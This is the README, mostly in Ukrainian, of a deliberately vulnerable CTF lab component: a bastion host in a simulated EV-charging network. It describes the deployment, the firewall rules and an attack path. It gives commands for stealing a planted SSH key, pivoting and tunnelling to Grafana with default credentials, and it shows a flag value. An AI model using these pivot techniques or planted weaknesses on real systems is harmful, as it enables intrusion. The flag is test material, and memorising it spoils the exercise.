# EcoCharge Jump Host (Bastion) - CTF Component

**Version:** 4.0.0  
**IP:** 192.168.100.40  
**OS:** Ubuntu 22.04  
**User:** operator  
**Network Zone:** DMZ (192.168.100.0/24)

---

## Overview

Jump Host (Bastion) — це проміжний сервер для доступу до Internal та OT мереж.
В CTF сценарії атакуючий використовує викрадений SSH ключ для pivot через Jump Host.

---

## Архітектура

Jump Host має **один мережевий інтерфейс** у DMZ.  
Доступ до Internal та OT досягається через **static routes** на Firewall VM.

```
                    ┌─────────────────┐
                    │   Jump Host     │
                    │ 192.168.100.40  │
                    │                 │
                    │  eth0 (DMZ)     │
                    └────────┬────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │   Firewall VM   │
                    │ 192.168.100.11  │
                    └────────┬────────┘
                             │
              ┌──────────────┼──────────────┐
              ▼              ▼              ▼
       ┌───────────┐  ┌───────────┐  ┌───────────┐
       │    DMZ    │  │  Internal │  │    OT     │
       │  .100.0   │  │   .20.0   │  │ 172.16.0  │
       │           │  │           │  │           │
       │ Grafana   │  │   CSMS    │  │ Chargers  │
       │ API GW    │  │           │  │           │
       └───────────┘  └───────────┘  └───────────┘
```

| Мережа | CIDR | Доступ з Jump Host |
|--------|------|-------------------|
| DMZ | 192.168.100.0/24 | Прямий (eth0) |
| Internal | 192.168.20.0/24 | Через Firewall |
| OT | 172.16.0.0/24 | Через Firewall |

---

## Vulnerability (FLAG #5)

### Stolen SSH Key

**Вектор:** SSH ключ `id_jumphost` знайдений на Web Server в `/root/.ssh/`

**Exploitation:**
```bash
# На Kali (після компрометації Web Server)
scp root@192.168.100.100:/root/.ssh/id_jumphost ./
ssh -i id_jumphost operator@192.168.100.40
```

**FLAG:** `FLAG{jump_h0st_p1v0t}`

**Location:** `/home/operator/FLAG_5.txt`

---

## Що атакуючий отримує з Jump Host

### Доступ до Internal мережі (CSMS)

```bash
# CitrineOS UI (Next.js 15.1.2 - VULNERABLE!)
curl http://192.168.20.20:3000

# Hasura GraphQL Console
curl http://192.168.20.20:8090/console

# CSMS API
curl http://192.168.20.20:8080/docs
```

### Доступ до DMZ сервісів

```bash
# Grafana (default creds: admin/admin)
curl http://192.168.100.30:3000

# API Gateway
curl http://192.168.100.20:8080/api/v1/health
```

### SSH Tunnel до Grafana

```bash
# Створити tunnel для доступу до Grafana з Kali
ssh -L 3000:192.168.100.30:3000 -i id_jumphost operator@192.168.100.40 -N &

# Тепер Grafana доступна на localhost:3000
```

---

## Розгортання

### 1. На Jump Host VM

```bash
sudo ./setup.sh
```

### 2. Firewall правила (ОБОВ'ЯЗКОВО!)

На Firewall VM додати:

```bash
# Jump Host <-> Internal (CSMS)
iptables -I FORWARD 1 -s 192.168.100.40 -d 192.168.20.0/24 -j ACCEPT
iptables -I FORWARD 2 -s 192.168.20.0/24 -d 192.168.100.40 -j ACCEPT

# Jump Host <-> OT (Chargers)  
iptables -I FORWARD 3 -s 192.168.100.40 -d 172.16.0.0/24 -j ACCEPT
iptables -I FORWARD 4 -s 172.16.0.0/24 -d 192.168.100.40 -j ACCEPT

# Jump Host <-> Grafana
iptables -I FORWARD 5 -s 192.168.100.40 -d 192.168.100.30 -j ACCEPT

# Зберегти
iptables-save > /etc/iptables/rules.v4
```

### 3. Розповсюдження SSH ключа

```bash
# Скопіювати ключ на Web Server (щоб атакуючий міг його знайти)
scp ssh-keys/id_jumphost root@192.168.100.100:/root/.ssh/id_jumphost
```

### 4. Перевірка

```bash
ssh -i ssh-keys/id_jumphost operator@192.168.100.40
ping 192.168.20.20    # CSMS
ping 172.16.0.40      # CP001
```

---

## Attack Path (роль Jump Host)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         JUMP HOST В ATTACK CHAIN                            │
└─────────────────────────────────────────────────────────────────────────────┘

Phase 1-3 (Web Server)
         │
         │ SSH key stolen from /root/.ssh/id_jumphost
         ▼
┌─────────────────────┐
│     Jump Host       │  ◄── FLAG #5: jump_h0st_p1v0t
│  192.168.100.40     │
└──────────┬──────────┘
           │
     ┌─────┴─────┐
     ▼           ▼
┌─────────┐ ┌─────────┐
│ Grafana │ │  CSMS   │
│ :3000   │ │ :3000   │
│         │ │         │
│ FLAG #6 │ │ FLAG #7 │ ◄── CVE-2025-55182
└─────────┘ │ FLAG #8 │
            │ FLAG #9 │
            └─────────┘
```

---

## Встановлені інструменти

| Tool | Purpose |
|------|---------|
| `curl` | HTTP requests to CSMS, Grafana |
| `nmap` | Network scanning |
| `tcpdump` | Traffic capture |
| `wscat` | WebSocket/OCPP interaction |
| `psql` | PostgreSQL client |
| `python3` | Custom scripts |

---

## Файлова структура

```
jump-host-deploy-main/
├── setup.sh                    # Main deployment script
├── README.md                   # This file
├── scripts/
│   ├── generate-ssh-key.sh     # Generate SSH keypair
│   ├── distribute-key.sh       # Copy key to Web Server
│   ├── setup-db-flag.sh        # DB flag setup (optional)
│   ├── setup-ocpp-flag.sh      # OCPP flag setup (optional)
│   └── ot-impact-flag9.sh      # OT impact flag (optional)
└── ssh-keys/                   # Generated after setup
    ├── id_jumphost             # Private key (copy to Web Server)
    └── id_jumphost.pub         # Public key (on Jump Host)
```

---

## Security Notice

This deployment contains intentional vulnerabilities for CTF purposes.
Do NOT use in production environments.

---

**Version:** 4.0.0  
**Last Updated:** February 2025
